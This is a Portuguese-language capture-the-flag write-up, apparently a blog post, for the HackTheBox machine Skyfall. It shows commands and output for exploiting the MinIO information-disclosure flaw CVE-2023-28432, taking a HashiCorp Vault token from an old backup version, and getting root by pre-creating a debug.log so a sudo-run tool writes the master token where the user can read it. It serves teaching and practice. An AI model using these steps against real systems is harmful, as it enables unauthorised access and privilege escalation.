---
title: "Skyfall - HackTheBox"
date: 2024-02-04
published: true
lang: pt-BR
translation_key: "skyfall-htb"
original_url: /skyfall-htb
permalink: /pt-br/skyfall-htb
---
# [](#intro)Introdução

No post de hoje você vai encontrar uma solução write-up para a máquina HackTheBox Skyfall. Vamos ao que interessa?


# [](#approach)Approach mindset

Para nossa mentalidade de abordagem, vamos separá-la como os seguintes passos:

1. Reconhecimento
2. Obtendo apoio
3. Enumeração do sistema / Escalação do privilégio


# # [](#step1-recon)Passo 1 - Reconhecimento

Como sempre, iniciaremos a enumeração de portas abertas com Nmap:

```bash
$ sudo nmap -p- -T4 --min-rate 1000 -A -oA nmap/initial 10.129.78.160
Nmap scan report for 10.129.78.160
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=2/4%OT=22%CT=1%CU=44376%PV=Y%DS=2%DC=T%G=Y%TM=65BF912F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   129.73 ms 10.10.14.1
2   129.85 ms 10.129.78.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  4 13:29:19 2024 -- 1 IP address (1 host up) scanned in 104.10 seconds
```
A única porta aberta disponível para nós agora é a porta 80, que contém o seguinte serviço web:

<img src="../figs/skyfall1.png" alt="skyfall homepage">

Depois de rolar para baixo, encontramos um link para http://demo.skyfall.htb. Para tornar isso acessível, precisamos adicionar este domínio ao nosso arquivo `/etc/hosts`. Fazemos isso simplesmente abrindo Vim como raiz, e anexando à última linha `<machine-ip> skyfall.htb demo.skyfall.htb`. Agora podemos aceder a esta máquina virtual:

<img src="../figs/skyfall2.png" alt="demo skyfall login">

Esta página de login nos diz diretamente um par de credenciais: `guest:guest`. Ao acessá-lo como convidado, chegamos a isto:

<img src="../figs/skyfall3.png" alt="demo skyfall dashboard">

Este painel, apesar de estar equipado com uma variedade de funcionalidades, incluindo uploads de arquivos e um captador de URL, não exibe vulnerabilidades aparentes. Também tentei enumerar com gobuster, mas nada foi encontrado.

Depois disso, decidi usar o BurpSuite e entender o que estava acontecendo debaixo do capô. Eu percebi que quando passamos uma string aleatória para o coletor de URL como abaixo:

<img src="../figs/skyfall4.png" alt="url fetcher functionality">

Temos uma resposta no canto inferior direito da página:

<img src="../figs/skyfall5.png" alt="error messsage">

Se tentarmos buscar o próprio site do Skyfall URL http://demo.skyfall.htb, recebemos esta mensagem:

<img src="../figs/skyfall6.png" alt="error disclosure">

Indicando um erro de resolução de nome simples. Depois de tentar outras cargas da SSRF, não consegui nada.

Em seguida, analisei a funcionalidade de download no endpoint `/files`. Interceptando o pedido com Burp, podemos encontrar o seguinte:

<img src="../figs/skyfall7.png" alt="burp download intercept">

Poderíamos tentar um LFI aqui passando `/etc/passwd` para o parâmetro URL do nome do arquivo. Isto nos dá:

<img src="../figs/skyfall8.png" alt="S3 disclosure">

Isso indica que há uma conexão com algum tipo de balde de armazenamento na nuvem. Podemos ver que este armazenamento pode ser MinIO, como podemos vê-lo no navbar. Se clicarmos nas métricas MinIO, teremos um 403:

<img src="../figs/skyfall9.png" alt="metrics 403">

Um simples bypass 403 funcionou para revelar as informações desta página:

<img src="../figs/skyfall10.png" alt="metrics 403">

No fundo destas métricas, encontramos outro ponto final:

<img src="../figs/skyfall11.png" alt="production endpoint">

Depois de adicioná-lo ao nosso arquivo `/etc/hosts` e acessá-lo, temos uma resposta 403, que não pode ser simplesmente contornada como fizemos com o endpoint `/metric`.

Com uma pesquisa simples no Google, consegui encontrar [este](https://nvd.nist.gov/vuln/detail/CVE-2023-28432) CVE que funcionou. Este CVE refere vulnerabilidade à divulgação de informações no desfecho de MinIO `http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify`, que é outro bypass 403. Seguindo [este artigo](https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/), vemos que mudar o método de solicitação de GET para POST vaza `MINIO_ROOT_PASSWORD` e `MINIO_ROOT_USER`:

<img src="../figs/skyfall12.png" alt="leaked info">

Agora, dei um passo atrás e comecei a ler a documentação da MinIO. Eu poderia descobrir que há uma maneira de se comunicar com MinIO através de uma interface CLI. Existe um comando para trabalhar interativamente com o armazenamento S3 do terminal com MinIO Client `mc`. Podemos verificar como usá-lo [here](https://min.io/docs/minio/linux/reference/minio-mc.html). Para instalar o MinIO Client CLI, executamos o seguinte comando no Linux:

```bash
curl https://dl.min.io/client/mc/release/linux-amd64/mc \
  --create-dirs \
  -o $HOME/minio-binaries/mc

chmod +x $HOME/minio-binaries/mc
export PATH=$PATH:$HOME/minio-binaries/

mc --help
```
Na documentação, podemos ver que para conectar nossa máquina à MinIO, precisamos executar `mc alias set myminio https://minioserver.example.net ACCESS_KEY SECRET_KEY`, onde a chave de acesso é o `MINIO_ROOT_USER` e a chave secreta os valores `MINIO_ROOT_PASSWORD` que encontramos anteriormente. Se tudo for feito corretamente, devemos receber esta mensagem:

```bash
$ ./mc alias set myminio http://prd23-s3-backend.skyfall.htb <MINIO_ROOT_USER> <MINIO_ROOT_PASSWORD>
Added `myminio` successfully.
```
Agora podemos listar os arquivos com o seguinte comando:

```bash
$ ./mc ls --recursive myminio
[2023-11-08 05:35:28 GMT]  48KiB STANDARD askyy/Welcome.pdf
[2023-11-09 21:37:25 GMT] 2.5KiB STANDARD askyy/home_backup.tar.gz
[2023-11-08 05:35:36 GMT]  48KiB STANDARD btanner/Welcome.pdf
[2023-11-08 05:35:56 GMT]  48KiB STANDARD emoneypenny/Welcome.pdf
[2023-11-08 05:36:02 GMT]  48KiB STANDARD gmallory/Welcome.pdf
[2023-11-08 00:08:05 GMT]  48KiB STANDARD guest/Welcome.pdf
[2023-11-08 05:35:45 GMT]  48KiB STANDARD jbond/Welcome.pdf
[2023-11-08 05:36:09 GMT]  48KiB STANDARD omansfield/Welcome.pdf
[2023-11-08 05:35:51 GMT]  48KiB STANDARD rsilva/Welcome.pdf
```
Podemos ver que há um arquivo de backup por aí. Podemos usar o MinIO Client para copiar arquivos para nossa máquina local usando o comando `cp`:

```bash
$ ./mc cp --recursive myminio/askyy/home_backup.tar.gz .
...kup.tar.gz: 2.48 KiB / 2.48 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 30.23 KiB/s 0s
```
Isto fará uma cópia do arquivo de backup no diretório da sua máquina local atual. Após descompactar o arquivo e analisá-lo, encontrei um arquivo `id_rsa` que não pôde ser usado para fazer login como usuário `askyy`. Olhando para trás na documentação do MinIO, percebi que também podemos listar versões de arquivos com a bandeira `--version`. Foi o que fiz a seguir.

```bash
$ ./mc ls --recursive --versions myminio/askyy/home_backup.tar.gz
[2023-11-09 21:37:25 GMT] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
[2023-11-09 21:37:09 GMT] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
[2023-11-09 21:36:30 GMT] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz
```
Havia três versões diferentes deste backup, e baixamos o último, v3. A primeira versão é interessante, uma vez que é muito maior do que os outros dois. No entanto, também não tinha nada muito interessante nele. Então, eu baixei a segunda versão e encontrei outro ponto final e um símbolo de cofre HashiCorp. Primeiro, para baixar uma versão mais antiga do arquivo MinIO, devemos executar:

```bash
$ ./mc undo myminio/askyy/home_backup.tar.gz --recursive --last 3 --force
✓ Last upload of `home_backup.tar.gz` (vid=25835695-5e73-4c13-82f7-30fd2da2cf61) is reverted.
✓ Last upload of `home_backup.tar.gz` (vid=2b75346d-2a47-4203-ab09-3c9f878466b8) is reverted.
✓ Last upload of `home_backup.tar.gz` (vid=3c498578-8dfe-43b7-b679-32a3fe42018f) is reverted.
```
Em seguida, baixamos o arquivo com o comando cp, mas passando a bandeira `--version-id` seguida pelo UUID desse arquivo:

```bash
$ ./mc cp --version-id=2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz .
...kup.tar.gz: 2.64 KiB / 2.64 KiB ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 39.08 KiB/s 0s
```
Então descompactamos o arquivo com `tar`:

```bash
$ tar -xzvf home_backup.tar.gz 
./
./.profile
./.bashrc
./.ssh/
./.ssh/authorized_keys
./.sudo_as_admin_successful
./.bash_history
./.bash_logout
./.cache/
./.cache/motd.legal-displayed
```
Dentro do arquivo de backup, podemos encontrar essas linhas dentro do arquivo `.bashrc`:

```bash
[...snip...]
# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
[...snip...]
```
## [](#step3-foothold)Passo 2 - Obtendo apoio

Com o endpoint do cofre HashiCorp e a chave do cofre, podemos obter apoio gerando um Ssh OTP (One-Time Password). Primeiro, temos de instalar o cofre HashiCorp na nossa máquina. Eu uso o Arch Linux, então eu instalei com `sudo snap install vault`. Olhando para a abóbada [documentação](https://developer.hashicorp.com/vault/docs/commands), vemos que precisamos definir duas variáveis: `VAULT_TOKEN` e `VAULT_ADDR`. Para isso, corremos:

```bash
$ export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
$ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
```
E depois verifica se está tudo a correr com:

<img src="../figs/skyfall13.png" alt="vault status">

Não se esqueça de adicionar esta nova máquina ao arquivo `/etc/hosts`. Para criar um Ssh OTP, precisamos de uma chave OTP. Podemos listar as chaves OTP usando:

```bash
vault list ssh/roles
Keys
----
admin_otp_key_role
dev_otp_key_role
```
Não podemos usar a chave `admin_otp_key_role`, pois ela nos dá permissão negada:

<img src="../figs/skyfall-comp.png" alt="admin otp key cannot be used">

Mas podemos usar a outra chave. Com ele, escrevemos um ssh OTP com o seguinte comando:

<img src="../figs/skyfall14.png" alt="otp">

Não se esqueça de fornecer a bandeira `username`, caso contrário você receberá o nome de usuário `nobody`, que não é sshable. Para ssh com sucesso, executamos `ssh askyy@<machine-ip>` e fornecemos o OTP como senha:

```bash
$ ssh askyy@10.129.15.193
(askyy@10.129.15.193) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
askyy@skyfall:~$ wc -c user.txt 
33 user.txt
```
# # [](#step3-crafting-the-attack)Passo 3 - enumeração do sistema

A raiz era super simples. Primeiro, rodamos `sudo -l` e verificamos o seguinte:

```bash
askyy@skyfall:~$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml [-vhd]*
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```
Vamos executar este binário como root e ver o que acontece:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml
[>] Checking seal status
[+] Vault sealed: false
```
Note que não aconteceu nada. O `sudo -l` nos diz que também podemos usar bandeiras `-v -h -d`, então vamos tentar `-h` primeiro:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
```
Então podemos executar o modo verbose e depuração. Vamos experimentá-los, primeiro com verbose:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[-] Master token found in config: ****************************
[>] Enable 'debug' mode for details
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
```
Isso nos diz que este comando está vazando um token mestre do cofre, e precisamos executá-lo com o modo de depuração:

```bash
askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v -d
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
askyy@skyfall:~$ ls
debug.log  user.txt
askyy@skyfall:~$ cat debug.log 
cat: debug.log: Permission denied
askyy@skyfall:~$ ls -la debug.log 
-rw------- 1 root root 590 Feb  5 05:17 debug.log
```
Nós temos permissão negada aqui, porque o arquivo é de propriedade do root e só o root pode ler e escrever. No entanto, e se o arquivo `debug.log` já existisse no diretório atual, de propriedade do `askyy`? Para testar isso, criei um novo diretório e um arquivo `debug.log` dentro dele:

```bash
askyy@skyfall:~$ mkdir muka
askyy@skyfall:~$ cd muka
askyy@skyfall:~/muka$ touch debug.log
askyy@skyfall:~/muka$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v -d
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
askyy@skyfall:~/muka$ ls -la debug.log
-rw-rw-r-- 1 askyy askyy 590 Feb  5 05:19 debug.log
```
E agora podemos ler o conteúdo e encontrar o token mestre dentro deste log!

## [](#step3-crafting-the-attack)Passo 4 - Escalação do Privilégio

Agora que temos o token mestre, voltamos para nossa máquina local e usamos a atribuição deste token para nossa variável `VAULT_TOKEN`.

```bash
$ export VAULT_TOKEN=<token>
$ vault status
Key             Value
---             -----
Seal Type       shamir
Initialized     true
Sealed          false
Total Shares    1
Threshold       1
Version         1.15.1
Build Date      2023-10-20T19:16:11Z
Storage Type    file
Cluster Name    vault-cluster-746fa9de
Cluster ID      6fc384e6-b108-1b05-2825-1de249607986
HA Enabled      false
```
Com este token podemos criar um OTP para o usuário root executando o seguinte comando:

```bash
 vault write ssh/creds/admin_otp_key_role ip=10.129.15.193 username=root
Key                Value
---                -----
lease_id           ssh/creds/admin_otp_key_role/3zvgndWlUB1ZoeD0T19lmgTg
lease_duration     768h
lease_renewable    false
ip                 10.129.15.193
key                24d68169-218f-f65c-7c22-0f4d7efef1c2
key_type           otp
port               22
username           root
```
Agora, nós ssh como raiz:

<img src="../figs/skyfall15.png" alt="root shell">

A dar-nos a casca da raiz!

# [](#conclusions)Conclusão

Nesta CTF, aprendemos muito sobre o depósito da MinIO e o cofre da HashiCorp. Conseguimos contornar uma página 403 no http://demo.skyfall.htb para descobrir um ponto final de armazenamento do balde S3 MinIO, que comunicamos com ele usando o MinIO Client. Lá, encontramos um arquivo de backup contendo outro endpoint, agora correspondente ao HashiCorp Vault, e um Cofre Token. Este token foi usado para criar um OTP que poderia nos registrar como o usuário `askyy`.

Depois disso, aumentamos nossos privilégios usando `sudo -l` e abusando da propriedade do arquivo para ler o conteúdo do arquivo `debug.log` gerado pelo único comando que poderíamos executar como root. Dentro do arquivo, encontrámos outro símbolo de cofre, mas este era um símbolo mestre.

Finalmente, com o token mestre, fomos capazes de criar um OTP para o usuário root, que nos deu acesso à shell root.

Muita ação, de fato!

Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **!

<a href="/">Voltar</a>

